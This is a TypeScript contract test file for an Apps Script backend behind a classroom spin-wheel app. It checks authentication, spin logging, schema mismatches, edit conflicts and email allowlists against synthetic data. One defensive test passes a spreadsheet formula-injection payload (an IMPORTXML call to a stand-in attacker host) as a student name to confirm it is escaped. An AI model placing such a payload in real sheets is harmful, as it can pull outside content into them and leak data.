/**
 * Contract tests for the Apps Script backend (gas/Code.gs).
 *
 * The real backend source runs in a sandbox against in-memory fake sheets
 * holding synthetic data. See tests/gas/harness.mjs.
 */
import { describe, expect, it } from 'vitest';
import { createApiClient } from '../../src/api';
import { buildSpinLogPayload } from '../../src/utils/spin-log';
import { spin } from '../../src/utils/spin-engine';
import { createGasRuntime, syntheticSheets, TEST_TOKEN } from './harness.mjs';

const T = TEST_TOKEN;
const runtime = (overrides: { sheets?: Record<string, unknown[][]>; properties?: Record<string, string> } = {}) =>
  createGasRuntime({
    sheets: overrides.sheets ?? syntheticSheets(),
    properties: { API_TOKEN: T, ...(overrides.properties ?? {}) },
  });

const spinPayload = (extra: Record<string, unknown> = {}) => ({
  timestamp_iso: '2026-11-24T15:30:00.000Z',
  session_id: 'sess-1',
  period: 'A',
  student_name: 'Ada Sample',
  email: 'ada.sample@example.com',
  result_A: 'Nearctic',
  result_B: 'Aves',
  result_C: 'LC',
  plantae_mercy: false,
  veto_used: false,
  seed: '0123456789abcdef',
  is_test: false,
  rule_flags_json: '[]',
  ...extra,
});

describe('authentication', () => {
  it('rejects a missing or wrong token on every route, read and write', () => {
    const rt = runtime();
    const before = JSON.stringify([rt.rows('SpinsLog'), rt.rows('Settings'), rt.rows('Rings')]);
    for (const type of ['health', 'roster', 'rings', 'settings']) {
      expect(rt.get({ type }).content).toBe('Forbidden');
      expect(rt.get({ type, token: 'wrong' }).content).toBe('Forbidden');
      expect(rt.get({ type, token: '' }).content).toBe('Forbidden');
    }
    for (const body of [
      { type: 'logspin', payload: spinPayload() },
      { type: 'writesettings', rows: [{ key: 'x', value: 'y' }] },
      { type: 'writerings', rows: [{ ring_name: 'A', label: 'x', weight: 1 }] },
      { type: 'email', to: 'owner@example.com', subject: 's', text: 't' },
      { mode: 'getSpins' },
    ]) {
      expect(rt.post(body).content).toBe('Forbidden');
      expect(rt.post({ ...body, token: 'wrong' }).content).toBe('Forbidden');
    }
    expect(JSON.stringify([rt.rows('SpinsLog'), rt.rows('Settings'), rt.rows('Rings')])).toBe(before);
    expect(rt.sentEmails).toEqual([]);
  });

  it('does not expose the roster to an unauthenticated caller', () => {
    const body = runtime().get({ type: 'roster' }).content;
    expect(body).toBe('Forbidden');
    expect(body).not.toMatch(/example\.com/);
  });

  it('fails closed when API_TOKEN is not configured', () => {
    const rt = createGasRuntime({ sheets: syntheticSheets(), properties: {} });
    expect(rt.get({ type: 'health' }).content).toBe('Forbidden');
    expect(rt.get({ type: 'roster', token: '' }).content).toBe('Forbidden');
    expect(rt.get({ type: 'roster', token: 'null' }).content).toBe('Forbidden');
    expect(rt.post({ type: 'logspin', payload: spinPayload() }).content).toBe('Forbidden');
  });

  it('rejects a body that is not a JSON object', () => {
    const rt = runtime();
    expect(rt.postRaw('not json').content).toBe('Forbidden');
    expect(rt.postRaw('[1,2,3]').content).toBe('Forbidden');
    expect(rt.postRaw('').content).toBe('Forbidden');
  });

  it('ignores a token passed in the URL of a POST (the body is what counts)', () => {
    expect(runtime().post({ type: 'logspin', payload: spinPayload() }, { token: T }).content).toBe('Forbidden');
  });
});

describe('read routes', () => {
  it('health is ok when all tabs exist and degraded when one is missing', () => {
    expect(runtime().get({ type: 'health', token: T }).json).toEqual({ status: 'ok', contract: 2, warnings: [] });
    const sheets = syntheticSheets();
    delete (sheets as Record<string, unknown>).SpinsLog;
    expect(runtime({ sheets }).get({ type: 'health', token: T }).json).toEqual({
      status: 'degraded',
      contract: 2,
      missing: ['SpinsLog'],
      problems: [],
      warnings: [],
    });
  });

  it('roster returns the documented shape and skips blank rows', () => {
    const roster = runtime().get({ type: 'roster', token: T }).json;
    expect(roster).toHaveLength(5);
    expect(roster[0]).toEqual({
      email: 'ada.sample@example.com',
      first: 'Ada',
      last: 'Sample',
      class: 'Environmental Science',
      s1Period: 'A',
      s2Period: 'B',
    });
    expect(roster[2].s2Period).toBeNull();
  });

  it('rings and settings return one object per row keyed by header', () => {
    const rt = runtime();
    const rings = rt.get({ type: 'rings', token: T }).json;
    expect(rings).toHaveLength(25);
    expect(rings[0]).toEqual({ ring_name: 'A', label: 'Palearctic', color_hex: '#4f46e5', weight: 1, order_index: 0, active: true });
    const settings = rt.get({ type: 'settings', token: T }).json;
    expect(settings[0]).toEqual({ key: 'midterm_pair_cap_pct', value: 12, notes: 'Cap for A|B pairs in midterm mode' });
  });

  it('type is case-insensitive and unknown types return Not Found', () => {
    const rt = runtime();
    expect(rt.get({ type: 'HEALTH', token: T }).json.status).toBe('ok');
    expect(rt.get({ type: 'nope', token: T }).content).toBe('Not Found');
    expect(rt.get({ token: T }).content).toBe('Not Found');
    expect(rt.post({ type: 'nope', token: T }).content).toBe('Not Found');
  });
});

describe('logspin (append-only)', () => {
  it('appends exactly one row in header order and leaves earlier rows untouched', () => {
    const rt = runtime();
    expect(rt.post({ type: 'logspin', payload: spinPayload(), token: T }).json).toEqual({ ok: true, complete: true });
    const snapshot = JSON.stringify(rt.rows('SpinsLog'));
    expect(rt.post({ type: 'logspin', payload: spinPayload({ student_name: 'Ben Placeholder', seed: 'ffff' }), token: T }).json).toEqual({ ok: true, complete: true });

    const rows = rt.rows('SpinsLog');
    expect(rows).toHaveLength(3);
    expect(JSON.stringify(rows.slice(0, 2))).toBe(snapshot);
    expect(rows[1]).toEqual([
      '2026-11-24T15:30:00.000Z', 'sess-1', 'A', 'Ada Sample', 'ada.sample@example.com',
      'Nearctic', 'Aves', 'LC', false, false, '0123456789abcdef', false, '[]',
    ]);
  });

  it('reports failure, and writes nothing, when the SpinsLog tab is missing', () => {
    const sheets = syntheticSheets();
    delete (sheets as Record<string, unknown>).SpinsLog;
    const rt = runtime({ sheets });
    const res = rt.post({ type: 'logspin', payload: spinPayload(), token: T }).json;
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(/SpinsLog sheet was not found/);
  });

  it('rejects a payload that is missing or incomplete', () => {
    const rt = runtime();
    for (const payload of [undefined, null, 'text', [], {}, spinPayload({ result_B: '' }), spinPayload({ timestamp_iso: undefined })]) {
      expect(rt.post({ type: 'logspin', payload, token: T }).json.ok).toBe(false);
    }
    expect(rt.rows('SpinsLog')).toHaveLength(1);
  });

  it('starts an empty tab with the frozen header row', () => {
    const rt = runtime({ sheets: { ...syntheticSheets(), SpinsLog: [] } });
    expect(rt.post({ type: 'logspin', payload: spinPayload(), token: T }).json).toEqual({ ok: true, complete: true });
    const rows = rt.rows('SpinsLog');
    expect(rows[0]).toEqual(syntheticSheets().SpinsLog[0]);
    expect(rows[1][3]).toBe('Ada Sample');
  });

  it('stores client text as text, never as a spreadsheet formula', () => {
    const rt = runtime();
    rt.post({
      type: 'logspin',
      token: T,
      payload: spinPayload({ student_name: '=IMPORTXML("https://evil.test","//a")', email: '+1', period: '-A', session_id: '@x' }),
    });
    const row = rt.rows('SpinsLog')[1];
    for (const cell of row) {
      if (typeof cell === 'string') expect(cell).not.toMatch(/^[=@]/);
    }
    expect(row[3]).toBe(`'=IMPORTXML("https://evil.test","//a")`);
    expect(row[2]).toBe("'-A");
    // A plain signed number is left alone.
    expect(row[4]).toBe('+1');
  });

  it('stringifies rule flags sent as an array', () => {
    const rt = runtime();
    rt.post({ type: 'logspin', token: T, payload: spinPayload({ rule_flags_json: ['veto_respin'] }) });
    expect(rt.rows('SpinsLog')[1][12]).toBe('["veto_respin"]');
  });

  it('surfaces a Sheets failure instead of claiming success', () => {
    const rt = runtime();
    rt.sheet('SpinsLog').failAppend = true;
    const res = rt.post({ type: 'logspin', payload: spinPayload(), token: T }).json;
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(/Simulated Sheets failure/);
  });
});

describe('SpinsLog schema mismatch: a record is complete, incomplete, or refused, and says which', () => {
  const ALL = ['timestamp_iso', 'session_id', 'period', 'student_name', 'email', 'result_A', 'result_B', 'result_C', 'plantae_mercy', 'veto_used', 'seed', 'is_test', 'rule_flags_json'];
  const REQUIRED = ['timestamp_iso', 'period', 'student_name', 'email', 'result_A', 'result_B', 'result_C'];
  const OPTIONAL = ALL.filter((c) => !REQUIRED.includes(c));
  const withHeaders = (headers: string[], extraRows: unknown[][] = []) => {
    const sheets = syntheticSheets();
    // An empty header list means a completely empty tab, as in a new spreadsheet.
    sheets.SpinsLog = headers.length === 0 ? [] : [headers, ...extraRows];
    return runtime({ sheets });
  };
  const log = (rt: ReturnType<typeof runtime>, extra: Record<string, unknown> = {}) =>
    rt.post({ type: 'logspin', payload: spinPayload(extra), token: T }).json;

  it('complete: every column present', () => {
    const rt = withHeaders(ALL);
    expect(log(rt)).toEqual({ ok: true, complete: true });
    expect(rt.rows('SpinsLog')).toHaveLength(2);
  });

  it('complete is also reported when the columns are in a different order or the sheet has extras', () => {
    const rt = withHeaders(['teacher_note', ...[...ALL].reverse()]);
    expect(log(rt)).toEqual({ ok: true, complete: true });
    const [headers, row] = rt.rows('SpinsLog');
    expect(row[headers.indexOf('student_name')]).toBe('Ada Sample');
    expect(row[headers.indexOf('teacher_note')]).toBe('');
  });

  it.each(REQUIRED)('refused: required column %s is absent, and no partial row is written', (column) => {
    const existing = ALL.filter((c) => c !== column).map(() => 'earlier value');
    const rt = withHeaders(ALL.filter((c) => c !== column), [existing]);
    const before = JSON.stringify(rt.rows('SpinsLog'));
    const res = log(rt);
    expect(res.ok).toBe(false);
    expect(res.complete).toBeUndefined();
    expect(res.missing_required).toEqual([column]);
    expect(res.error).toBe(`Nothing was logged. The SpinsLog sheet is missing required columns: ${column}.`);
    expect(JSON.stringify(rt.rows('SpinsLog'))).toBe(before);
  });

  it('refused: lists every required column that is absent', () => {
    const rt = withHeaders(['timestamp_iso', 'student_name', 'result_A', 'result_B', 'result_C']);
    const res = log(rt);
    expect(res.ok).toBe(false);
    expect(res.missing_required).toEqual(['period', 'email']);
    expect(rt.rows('SpinsLog')).toHaveLength(1);
  });

  it.each(OPTIONAL)('incomplete: optional column %s is absent, the row is written and reported as incomplete', (column) => {
    const rt = withHeaders(ALL.filter((c) => c !== column));
    const res = log(rt);
    expect(res.ok).toBe(true);
    expect(res.complete).toBe(false);
    expect(res.missing_optional).toEqual([column]);
    expect(res.warnings[0]).toContain(column);
    const [headers, row] = rt.rows('SpinsLog');
    expect(row).toHaveLength(ALL.length - 1);
    // Everything that does have a column was stored.
    expect(row[headers.indexOf('student_name')]).toBe('Ada Sample');
    expect(row[headers.indexOf('result_B')]).toBe('Aves');
  });

  it('incomplete: only the required columns exist', () => {
    const rt = withHeaders(REQUIRED);
    const res = log(rt);
    expect(res).toMatchObject({ ok: true, complete: false, missing_optional: OPTIONAL });
    expect(rt.rows('SpinsLog')[1]).toEqual(['2026-11-24T15:30:00.000Z', 'A', 'Ada Sample', 'ada.sample@example.com', 'Nearctic', 'Aves', 'LC']);
  });

  it('never answers "complete" when a field was dropped', () => {
    // Every proper subset of the optional columns must be reported as not complete.
    for (let mask = 0; mask < 2 ** OPTIONAL.length - 1; mask++) {
      const present = OPTIONAL.filter((_, i) => mask & (1 << i));
      const res = log(withHeaders([...REQUIRED, ...present]));
      expect(res.ok).toBe(true);
      expect(res.complete).toBe(false);
      expect([...res.missing_optional].sort()).toEqual(OPTIONAL.filter((c) => !present.includes(c)).sort());
    }
  });

  it('a test spin is refused when there is no is_test column, so it can never pass for a real spin', () => {
    const rt = withHeaders(ALL.filter((c) => c !== 'is_test'));
    const res = log(rt, { is_test: true, student_name: '', email: '', rule_flags_json: '["auto_test_run"]' });
    expect(res.ok).toBe(false);
    expect(res.missing_required).toEqual(['is_test']);
    expect(rt.rows('SpinsLog')).toHaveLength(1);
    // A real spin into the same sheet is still written, as incomplete.
    expect(log(rt)).toMatchObject({ ok: true, complete: false, missing_optional: ['is_test'] });
  });

  it('column names must match exactly apart from surrounding spaces', () => {
    expect(log(withHeaders(ALL.map((c) => ` ${c} `)))).toEqual({ ok: true, complete: true });
    const res = log(withHeaders(ALL.map((c) => (c === 'email' ? 'Email' : c))));
    expect(res.ok).toBe(false);
    expect(res.missing_required).toEqual(['email']);
  });

  it('health reports the same problems before any spin is attempted', () => {
    expect(withHeaders(ALL).get({ type: 'health', token: T }).json).toEqual({ status: 'ok', contract: 2, warnings: [] });

    expect(withHeaders(REQUIRED).get({ type: 'health', token: T }).json).toEqual({
      status: 'ok',
      contract: 2,
      warnings: ['SpinsLog has no column for: session_id, plantae_mercy, veto_used, seed, is_test, rule_flags_json'],
    });

    const broken = withHeaders(['timestamp_iso', 'student_name', 'result_A', 'result_B', 'result_C']).get({ type: 'health', token: T }).json;
    expect(broken.status).toBe('degraded');
    expect(broken.problems).toEqual(['SpinsLog is missing required columns: period, email']);

    // A brand new, empty SpinsLog tab is fine: the header is created on the first spin.
    expect(withHeaders([]).get({ type: 'health', token: T }).json.status).toBe('ok');
  });

  it('health also catches a roster or settings tab the app cannot read', () => {
    const sheets = syntheticSheets();
    sheets.Roster = [['period', 'class', 'first', 'last', 'email', 'group', 'id'], ['1', 'Bio', 'Alex', 'Sample', 'alex@example.com', 'A', '101']];
    sheets.Settings = [['Key', 'Value']];
    const health = runtime({ sheets }).get({ type: 'health', token: T }).json;
    expect(health.status).toBe('degraded');
    expect(health.problems).toEqual([
      'Settings is missing required columns: key, value',
      'Roster has neither an "S1 Period" nor an "S2 Period" column',
    ]);
  });

  it('a failure half way through a first write is reported as a failure', () => {
    // Empty tab: the header row goes in, then the data row fails.
    const rt = withHeaders([]);
    const sheet = rt.sheet('SpinsLog');
    let calls = 0;
    const realAppend = sheet.appendRow.bind(sheet);
    sheet.appendRow = (values: unknown[]) => {
      calls++;
      if (calls === 2) throw new Error('Simulated Sheets failure');
      realAppend(values);
    };
    const res = log(rt);
    expect(res.ok).toBe(false);
    expect(res.complete).toBeUndefined();
    // Only the header exists. There is no data row pretending to be a spin.
    expect(rt.rows('SpinsLog')).toEqual([ALL]);
    // The next attempt succeeds and is complete.
    sheet.appendRow = realAppend;
    expect(log(rt)).toEqual({ ok: true, complete: true });
    expect(rt.rows('SpinsLog')).toHaveLength(2);
  });
});

describe('concurrent edits: a save never silently overwrites someone else\'s change', () => {
  const read = (rt: ReturnType<typeof runtime>, type: 'settings' | 'rings') => rt.get({ type, token: T }).json;

  it('saves normally when the sheet is unchanged since it was read', () => {
    const rt = runtime();
    const base = read(rt, 'settings');
    const rows = base.map((r: Record<string, unknown>) => (r.key === 'mode' ? { ...r, value: 'final' } : r));
    expect(rt.post({ type: 'writesettings', rows, base_rows: base, token: T }).json).toEqual({ ok: true, rows: 4 });
    expect(rt.rows('Settings')[2]).toEqual(['mode', 'final', 'midterm or final']);
  });

  it.each([
    ['a row was added', (sheet: { rows: unknown[][] }) => sheet.rows.push(['added_in_sheets', 'yes', 'by a colleague'])],
    ['a value was changed', (sheet: { rows: unknown[][] }) => (sheet.rows[1][1] = 25)],
    ['a note was changed', (sheet: { rows: unknown[][] }) => (sheet.rows[2][2] = 'updated note')],
    ['a row was deleted', (sheet: { rows: unknown[][] }) => sheet.rows.splice(3, 1)],
    ['rows were reordered', (sheet: { rows: unknown[][] }) => sheet.rows.splice(1, 2, sheet.rows[2], sheet.rows[1])],
  ])('refuses the save when %s in the meantime, and keeps that change', (_name, edit) => {
    const rt = runtime();
    const base = read(rt, 'settings');
    edit(rt.sheet('Settings'));
    const afterEdit = JSON.stringify(rt.rows('Settings'));

    const rows = base.map((r: Record<string, unknown>) => (r.key === 'mode' ? { ...r, value: 'final' } : r));
    const res = rt.post({ type: 'writesettings', rows, base_rows: base, token: T }).json;
    expect(res).toEqual({
      ok: false,
      conflict: true,
      error: 'The Settings sheet was changed by someone else after it was loaded. Nothing was saved. Reload and try again.',
    });
    expect(JSON.stringify(rt.rows('Settings'))).toBe(afterEdit);
  });

  it('protects the Rings sheet the same way', () => {
    const rt = runtime();
    const base = read(rt, 'rings');
    rt.sheet('Rings').rows[3][5] = false; // someone switches a slice off in Sheets
    const afterEdit = JSON.stringify(rt.rows('Rings'));
    const rows = base.map((r: Record<string, unknown>) => (r.label === 'Nearctic' ? { ...r, weight: 3 } : r));
    expect(rt.post({ type: 'writerings', rows, base_rows: base, token: T }).json.conflict).toBe(true);
    expect(JSON.stringify(rt.rows('Rings'))).toBe(afterEdit);
  });

  it('ignores differences that are not data: blank rows and key order', () => {
    const rt = runtime();
    const base = read(rt, 'settings');
    rt.sheet('Settings').rows.push(['', '', '']);
    const reordered = base.map((r: Record<string, unknown>) => ({ notes: r.notes, value: r.value, key: r.key }));
    expect(rt.post({ type: 'writesettings', rows: base, base_rows: reordered, token: T }).json.ok).toBe(true);
  });

  it('after reloading, the same edit goes through and the other person\'s row is still there', () => {
    const rt = runtime();
    const stale = read(rt, 'settings');
    rt.sheet('Settings').rows.push(['added_in_sheets', 'yes', 'by a colleague']);
    expect(rt.post({ type: 'writesettings', rows: stale, base_rows: stale, token: T }).json.conflict).toBe(true);

    const fresh = read(rt, 'settings');
    const rows = fresh.map((r: Record<string, unknown>) => (r.key === 'mode' ? { ...r, value: 'final' } : r));
    expect(rt.post({ type: 'writesettings', rows, base_rows: fresh, token: T }).json.ok).toBe(true);
    const keys = rt.rows('Settings').map((r: unknown[]) => r[0]);
    expect(keys).toContain('added_in_sheets');
    expect(rt.rows('Settings').find((r: unknown[]) => r[0] === 'mode')).toEqual(['mode', 'final', 'midterm or final']);
  });

  it('requests without base_rows behave as before, so older clients keep working', () => {
    const rt = runtime();
    rt.sheet('Settings').rows.push(['added_in_sheets', 'yes', '']);
    expect(rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], token: T }).json.ok).toBe(true);
    expect(rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], base_rows: 'nonsense', token: T }).json).toEqual({
      ok: false,
      error: 'base_rows must be a list.',
    });
  });
});

describe('getspins', () => {
  const seeded = () => {
    const rt = runtime();
    rt.post({ type: 'logspin', token: T, payload: spinPayload() });
    rt.post({ type: 'logspin', token: T, payload: spinPayload({ period: 'B', student_name: 'Dee Fixture', email: 'dee.fixture@example.com' }) });
    rt.post({ type: 'logspin', token: T, payload: spinPayload({ timestamp_iso: '2026-11-23T15:30:00.000Z' }) });
    rt.post({ type: 'logspin', token: T, payload: spinPayload({ is_test: true, student_name: '', email: '', rule_flags_json: '["auto_test_run"]' }) });
    return rt;
  };

  it('filters by date, period and email', () => {
    const rt = seeded();
    expect(rt.post({ mode: 'getSpins', date: '2026-11-24', token: T }).json).toHaveLength(3);
    expect(rt.post({ mode: 'getSpins', date: '2026-11-24', period: 'B', token: T }).json).toHaveLength(1);
    expect(rt.post({ mode: 'getSpins', date: '2026-11-24', email: 'ada.sample@example.com', token: T }).json).toHaveLength(1);
    expect(rt.post({ mode: 'getSpins', date: '2026-11-23', token: T }).json).toHaveLength(1);
    expect(rt.post({ mode: 'getSpins', date: '2020-01-01', token: T }).json).toEqual([]);
  });

  it('returns the documented row shape, including the test marker', () => {
    const rows = seeded().post({ mode: 'getSpins', date: '2026-11-24', token: T }).json;
    expect(rows[0]).toEqual({
      timestamp_iso: '2026-11-24T15:30:00.000Z',
      session_id: 'sess-1',
      student_name: 'Ada Sample',
      email: 'ada.sample@example.com',
      period: 'A',
      result_region: 'Nearctic',
      result_taxon: 'Aves',
      result_iucn: 'LC',
      plantae_mercy: false,
      veto_used: false,
      seed: '0123456789abcdef',
      is_test: false,
      rule_flags: [],
    });
    expect(rows[2].is_test).toBe(true);
    expect(rows[2].rule_flags).toEqual(['auto_test_run']);
  });
});

describe('writesettings and writerings (never destructive)', () => {
  it.each([
    ['no rows field', undefined],
    ['an empty list', []],
    ['something that is not a list', 'rows'],
    ['a row without a key', [{ key: 'a', value: '1' }, { value: 'orphan' }]],
    ['a row that is not an object', [{ key: 'a', value: '1' }, 'oops']],
  ])('refuses %s and leaves the Settings sheet exactly as it was', (_name, rows) => {
    const rt = runtime();
    const before = JSON.stringify(rt.rows('Settings'));
    const res = rt.post({ type: 'writesettings', rows, token: T }).json;
    expect(res.ok).toBe(false);
    expect(typeof res.error).toBe('string');
    expect(JSON.stringify(rt.rows('Settings'))).toBe(before);
  });

  it.each([
    ['an invalid ring name', [{ ring_name: 'Z', label: 'x', weight: 1 }]],
    ['a missing label', [{ ring_name: 'A', label: '', weight: 1 }]],
    ['a negative weight', [{ ring_name: 'A', label: 'x', weight: -1 }]],
    ['a text weight', [{ ring_name: 'A', label: 'x', weight: 'heavy' }]],
    ['an empty list', []],
  ])('refuses rings with %s and leaves the Rings sheet exactly as it was', (_name, rows) => {
    const rt = runtime();
    const before = JSON.stringify(rt.rows('Rings'));
    expect(rt.post({ type: 'writerings', rows, token: T }).json.ok).toBe(false);
    expect(JSON.stringify(rt.rows('Rings'))).toBe(before);
  });

  it('refuses an oversized request', () => {
    const rt = runtime();
    const rows = Array.from({ length: 501 }, (_, i) => ({ key: `k${i}`, value: 'v' }));
    expect(rt.post({ type: 'writesettings', rows, token: T }).json).toEqual({ ok: false, error: 'Too many rows (501).' });
  });

  it('replaces the contents and clears rows left over from a longer sheet', () => {
    const rt = runtime();
    const res = rt.post({
      type: 'writesettings',
      token: T,
      rows: [{ key: 'mode', value: 'final', notes: 'changed' }, { key: 'enableAudio', value: 'true', notes: '' }],
    }).json;
    expect(res).toEqual({ ok: true, rows: 2 });
    const sheet = rt.sheet('Settings');
    sheet.trim();
    expect(rt.rows('Settings')).toEqual([
      ['key', 'value', 'notes'],
      ['mode', 'final', 'changed'],
      ['enableAudio', 'true', ''],
    ]);
  });

  it('keeps extra columns the teacher added to the sheet', () => {
    const sheets = syntheticSheets();
    sheets.Settings = [
      ['key', 'value', 'notes', 'owner'],
      ['mode', 'midterm', 'midterm or final', 'RG'],
    ];
    const rt = runtime({ sheets });
    const current = rt.get({ type: 'settings', token: T }).json;
    current[0].value = 'final';
    expect(rt.post({ type: 'writesettings', rows: current, token: T }).json.ok).toBe(true);
    expect(rt.rows('Settings')).toEqual([
      ['key', 'value', 'notes', 'owner'],
      ['mode', 'final', 'midterm or final', 'RG'],
    ]);
  });

  it('a read followed by an unchanged write leaves the Rings sheet identical', () => {
    const rt = runtime();
    const before = JSON.stringify(rt.rows('Rings'));
    const rows = rt.get({ type: 'rings', token: T }).json;
    expect(rt.post({ type: 'writerings', rows, token: T }).json).toEqual({ ok: true, rows: 25 });
    expect(JSON.stringify(rt.rows('Rings'))).toBe(before);
  });

  it('reports failure when the tab is missing', () => {
    const sheets = syntheticSheets();
    delete (sheets as Record<string, unknown>).Rings;
    const res = runtime({ sheets }).post({ type: 'writerings', rows: [{ ring_name: 'A', label: 'x', weight: 1 }], token: T }).json;
    expect(res.ok).toBe(false);
    expect(res.error).toMatch(/Rings sheet was not found/);
  });

  it('never lets a write touch the roster or the spin log', () => {
    const rt = runtime();
    rt.post({ type: 'logspin', token: T, payload: spinPayload() });
    const before = JSON.stringify([rt.rows('Roster'), rt.rows('SpinsLog')]);
    rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], token: T });
    rt.post({ type: 'writerings', rows: [{ ring_name: 'A', label: 'x', weight: 1 }], token: T });
    expect(JSON.stringify([rt.rows('Roster'), rt.rows('SpinsLog')])).toBe(before);
  });
});

describe('optional admin token', () => {
  const ADMIN = 'admin-token-not-a-real-secret';

  it('is not required when ADMIN_TOKEN is unset (current production behavior)', () => {
    expect(runtime().post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], token: T }).json.ok).toBe(true);
  });

  it('when set, guards configuration writes and email but not spins or reads', () => {
    const rt = runtime({ properties: { ADMIN_TOKEN: ADMIN } });
    const before = JSON.stringify([rt.rows('Settings'), rt.rows('Rings')]);

    expect(rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], token: T }).content).toBe('Forbidden');
    expect(rt.post({ type: 'writerings', rows: [{ ring_name: 'A', label: 'x', weight: 1 }], token: T, admin_token: 'wrong' }).content).toBe('Forbidden');
    expect(rt.post({ type: 'email', to: 'owner@example.com', subject: 's', token: T }).content).toBe('Forbidden');
    expect(JSON.stringify([rt.rows('Settings'), rt.rows('Rings')])).toBe(before);
    expect(rt.sentEmails).toEqual([]);

    // The admin token alone is not enough: the API token is still required.
    expect(rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], admin_token: ADMIN }).content).toBe('Forbidden');

    expect(rt.post({ type: 'writesettings', rows: [{ key: 'mode', value: 'final' }], token: T, admin_token: ADMIN }).json.ok).toBe(true);
    expect(rt.post({ type: 'logspin', payload: spinPayload(), token: T }).json).toEqual({ ok: true, complete: true });
    expect(rt.get({ type: 'roster', token: T }).json).toHaveLength(5);
  });
});

describe('email route', () => {
  it('by default only sends to the script owner', () => {
    const rt = runtime();
    expect(rt.post({ type: 'email', to: 'someone.else@example.org', subject: 'hi', text: 'x', token: T }).json).toEqual({
      ok: false,
      error: 'That recipient is not allowed.',
    });
    expect(rt.sentEmails).toEqual([]);
    expect(rt.post({ type: 'email', to: 'Owner@Example.com', subject: 'hi', text: 'x', token: T }).json).toEqual({ ok: true });
    expect(rt.sentEmails).toEqual([['owner@example.com', 'hi', 'x']]);
  });

  it('honours an explicit allowlist and refuses multiple recipients', () => {
    const rt = runtime({ properties: { EMAIL_ALLOWED_RECIPIENTS: 'alerts@example.com, second@example.com' } });
    expect(rt.post({ type: 'email', to: 'second@example.com', subject: 's', token: T }).json.ok).toBe(true);
    expect(rt.post({ type: 'email', to: 'owner@example.com', subject: 's', token: T }).json.ok).toBe(false);
    expect(rt.post({ type: 'email', to: 'alerts@example.com, victim@example.org', subject: 's', token: T }).json.ok).toBe(false);
    expect(rt.post({ type: 'email', subject: 's', token: T }).json.ok).toBe(false);
    expect(rt.sentEmails).toHaveLength(1);
  });
});

describe('frontend client and backend agree end to end', () => {
  /** A fetch that calls the sandboxed backend directly, the way the browser would over HTTP. */
  const connect = (rt: ReturnType<typeof runtime>, token = T) =>
    createApiClient({
      url: 'https://backend.test/exec',
      token,
      fetchImpl: (async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = new URL(String(input));
        const res =
          init?.method === 'POST'
            ? rt.postRaw(String(init.body), Object.fromEntries(url.searchParams))
            : rt.get(Object.fromEntries(url.searchParams));
        return new Response(res.content, { status: 200, headers: { 'Content-Type': res.mimeType } });
      }) as typeof fetch,
    });

  it('reads health, roster, rings and settings', async () => {
    const client = connect(runtime());
    await expect(client.health()).resolves.toEqual({ status: 'ok', warnings: [], contract: 2 });
    const roster = await client.roster();
    expect(roster.map((s) => `${s.first} ${s.last}`)).toEqual(['Ada Sample', 'Ben Placeholder', 'Cy Demo', 'Dee Fixture', 'Eli Testcase']);
    expect(await client.rings()).toHaveLength(25);
    const settings = await client.settings();
    // Real booleans and numbers in the sheet arrive as strings the settings parser understands.
    expect(settings.find((s) => s.key === 'enableAudio')?.value).toBe('false');
    expect(settings.find((s) => s.key === 'midterm_pair_cap_pct')?.value).toBe('12');
  });

  it('a spin built by the frontend lands in the sheet and reads back identically', async () => {
    const rt = runtime();
    const client = connect(rt);
    const outcome = spin({ seed: 'contract-seed' });
    const payload = buildSpinLogPayload({
      outcome,
      timestamp: new Date('2026-11-24T15:30:00.000Z'),
      sessionId: 'sess-9',
      student: { name: 'Ada Sample', email: 'ada.sample@example.com', period: 'A' },
      isTest: false,
    });
    await expect(client.logSpin(payload)).resolves.toEqual({ ok: true, complete: true, missing: [], warnings: [] });

    const [headers, row] = rt.rows('SpinsLog');
    expect(Object.fromEntries(headers.map((h: string, i: number) => [h, row[i]]))).toEqual(payload);

    const spins = await client.getSpins({ date: '2026-11-24', period: 'A' });
    expect(spins).toEqual([
      {
        timestamp_iso: payload.timestamp_iso,
        student_name: 'Ada Sample',
        email: 'ada.sample@example.com',
        period: 'A',
        result_region: outcome.region,
        result_taxon: outcome.taxon,
        result_iucn: outcome.iucn,
        plantae_mercy: false,
        veto_used: false,
        rule_flags: [],
        is_test: false,
      },
    ]);
  });

  it('the client reports a wrong token and a failed write as errors', async () => {
    const rt = runtime();
    await expect(connect(rt, 'wrong').roster()).rejects.toMatchObject({ kind: 'forbidden' });
    await expect(connect(rt).writeSettings([])).rejects.toMatchObject({ kind: 'rejected' });
    rt.sheet('SpinsLog').failAppend = true;
    await expect(
      connect(rt).logSpin(buildSpinLogPayload({ outcome: spin({ seed: 's' }), timestamp: new Date(), sessionId: 's', student: null, isTest: false }))
    ).rejects.toMatchObject({ kind: 'rejected' });
    expect(rt.rows('SpinsLog')).toHaveLength(1);
  });

  it('settings and rings survive a client read-modify-write round trip', async () => {
    const rt = runtime();
    const client = connect(rt);
    const settings = await client.settings();
    await client.writeSettings(settings);
    expect(await client.settings()).toEqual(settings);
    const rings = await client.rings();
    await client.writeRings(rings);
    expect(await client.rings()).toEqual(rings);
    expect(rt.rows('Rings')).toHaveLength(26);
  });
});
